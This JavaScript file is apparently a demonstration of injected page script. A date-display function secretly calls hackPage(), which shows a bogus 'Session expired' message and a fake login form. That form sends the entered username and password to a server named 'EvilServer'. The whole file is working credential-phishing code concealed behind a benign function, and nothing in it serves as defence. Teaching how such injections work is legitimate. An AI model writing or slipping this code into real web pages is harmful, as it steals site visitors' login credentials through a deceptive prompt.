function showDate()
{
	document.getElementById("date").innerHTML=Date();
	
	//Should not be here!
	hackPage();
}


function hackPage()
{
	var body = document.getElementsByTagName("body")[0];
	
	//Start by outputting bogus error message (Session Expired)
	//Create br and add to page
	var br = document.createElement("br");
	body.appendChild(br);	
	var br0 = document.createElement("br");
	body.appendChild(br0);	
	
	//Create bold element 
	var bold = document.createElement("b");
	//Create text node for message
	var message = document.createTextNode("Session expired, please log in again");
	//Add message to bold element
	bold.appendChild(message);
	//Add bold element to body
	body.appendChild(bold);

	//Create "login form" to grab user login details...
	//Create form and set attributes
	var newForm = document.createElement("form");
	newForm.action="EvilServer";
	newForm.method="GET";
	
	//Create "Username:"
	var newUsernameLabel = document.createTextNode("Username:");
	newForm.appendChild(newUsernameLabel);
	
	//Create username input control
	var newUsername = document.createElement("input");
	newUsername.type="textbox";
	newUsername.name="username";
	newForm.appendChild(newUsername);
	
	//Create <br/> 
	var br = document.createElement("br");
	newForm.appendChild(br);
	
	//Create "Password:"
	var newPasswordLabel = document.createTextNode("Password:");
	newForm.appendChild(newPasswordLabel);
	
	//Create password input control
	var newPassword = document.createElement("input");
	newPassword.type="password";
	newPassword.name="password";
	newForm.appendChild(newPassword);
	
	//Create <br/> 
	var br2 = document.createElement("br");
	newForm.appendChild(br2);
	
	//Create submit button
	var submitButton = document.createElement("input");
	submitButton.type="submit";
	submitButton.value="Login";
	
	newForm.appendChild(submitButton);
	
	body.appendChild(newForm);
	
}